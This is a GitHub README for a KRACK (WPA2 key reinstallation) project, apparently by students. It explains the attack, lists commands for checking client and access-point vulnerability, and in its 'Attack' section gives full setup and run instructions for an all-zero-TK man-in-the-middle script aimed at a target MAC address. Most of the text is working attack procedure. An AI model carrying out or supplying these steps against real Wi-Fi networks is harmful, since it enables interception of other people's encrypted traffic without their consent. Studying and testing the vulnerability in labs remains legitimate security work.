# Krack-Attack

<p align="center"><img src="https://user-images.githubusercontent.com/68508896/180347823-695a3063-228f-4a09-aa4a-461d1c0c32de.png" width="100%"/></p>

KRACK is short for Key Reinstallation Attack. It is an attack that leverages a vulnerability in the Wi-Fi Protected Access 2 (WPA2) protocol, which keeps your Wi-Fi connection secure. For hackers, KRACK is a tool they use when in close range of one of their targets to access encrypted data.

When KRACK was first introduced in 2017, it shattered the perception that WPA2 was secure. This meant that the Wi-Fi “haven” in people’s homes had been penetrated. As researchers uncovered the threat, they discovered that several types of devices were all vulnerable, including those running iOS, Android, Linux, macOS, and Windows. 

However, despite the weaknesses found in WPA2, there are still ways to use the internet without constantly worrying about hackers penetrating your system.

------------

<h1>Vulnerability Check</h1>

<h3>Check Client Vulnerability</h3>

Run Scripts:
- run 'sudo apt update'
- run 'sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils virtualenv'
- Clone https://github.com/vanhoefm/krackattacks-scripts
- navigate to 'hostapd' folder
- run 'cp defconfig .config'
- run 'make -j 2'
- navigate to 'krackattack' folder
- run 'sudo ./build.sh'
- run 'sudo ./pysetup.sh'
- run 'sudo ./disable-hwcrypto.sh'

Before every usage
- run 'sudo rfkill unblock wifi'
- run 'service network-manager stop'
- navigate to 'krackattack' folder
- run 'sudo su'
- run 'virtualenv venv'
- run 'source venv/bin/activate'
- run 'sudo python3 krack-test-client.py'
- optional: if scapy installation needed, run 'pip install scapy==2.4.4'


<h3>Check AP Vulnerability</h3>
(Optional:) In case of long interface name run: 'sudo airmon-ng start INTERFACE_NAME'       
<br /><br />     

First, Make wpa_supplicant conf file:      

- run 'wpa_passphrase AP-NAME AP-PASS | sudo tee /etc/wpa_supplicant.conf'      
(after entering AP-NAME & AP-PASS)

(Optional:) To check connectivity: 'sudo wpa_supplicant -c /etc/wpa_supplicant.conf -i INTERFACE_NAME'

Run Scripts:
- ./krack-ft-test.py wpa_supplicant -D nl80211 -i wlan0mon -c /etc/wpa_supplicant.conf

---------
<h1>Attack</h1>

<b>Note! In order for the script to work properly:    
- The code execution is under python 2   
- Execution permission must be given to the 'hostapd' file located in the 'hostapd' folder   
  (for example navigate to the hostapd folder and run: sudo chmod 777 hostapd)   
- The code must be run from the krackattack-all-zero-tk-key root folder   
- In case of long interface name please run 'sudo airmon-ng start INTERFACE_NAME'</b>  


No need to install an external MitM library. The attack files in this repository include the MitM-ChannelBased implementation files.
<p align="center"><img src="https://user-images.githubusercontent.com/68508896/180347003-a7a58f68-0819-4c54-bacb-d10cebcc2537.png"/></p>


First, Clone this repository for the attack files.

Dependencies:   
- sudo apt update
- sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

Before execution run the following commands:
- sudo airmon-ng check kill
- service network-manager stop
- sudo rfkill unblock wifi

krack_all_zero_tk.py Run example:
- sudo python ./krackattack/krack_all_zero_tk.py wlx6c5ab0b3f988 wlan0mon ens33 "check" -t F0:27:65:DA:AD:E8    
(See below for an explanation of the command)     
    
The code may require the following packages:
- macchanger
- connect-proxy (sudo apt install connect-proxy)
- socket (sudo apt install socket)

---------
<h1>Sources</h1>

[https://github.com/vanhoefm/krackattacks](https://github.com/vanhoefm/krackattacks)      
[https://github.com/vanhoefm/krackattacks-scripts](https://github.com/vanhoefm/krackattacks-scripts)      
https://github.com/lucascouto/krackattack-all-zero-tk-key    

Additional:    
https://github.com/kristate/krackinfo    
https://github.com/fwalloe/KrackPlus   
https://pypi.org/project/mitm-channel-based (mitm-channel-based)

---------
<h1>Troubleshooting</h1>

<b>Error:</b> L2Socket is Not defined   
<b>Solution:</b> Install scapy 2.4.4 (python2 -m pip install scapy==2.4.4)   

<b>Error:</b> SIOCSIFFLAGS: No such device   
<b>Solution:</b> Re-plug the adapter   

<b>Name:</b> pip for python2   
<b>Reference:</b> https://linuxize.com/post/how-to-install-pip-on-ubuntu-18.04   

<b>Name:</b> tp-link-wn821n driver   
<b>Reference:</b> https://askubuntu.com/questions/879868/tp-link-wn821n-23570107-not-working   


---------
Itay Github: [https://github.com/itay-rafee](https://github.com/itay-rafee)  
Almog Github: [https://github.com/AlmogJakov](https://github.com/AlmogJakov)  
Elhai Github: [https://github.com/ElhaiMansbach](https://github.com/ElhaiMansbach)
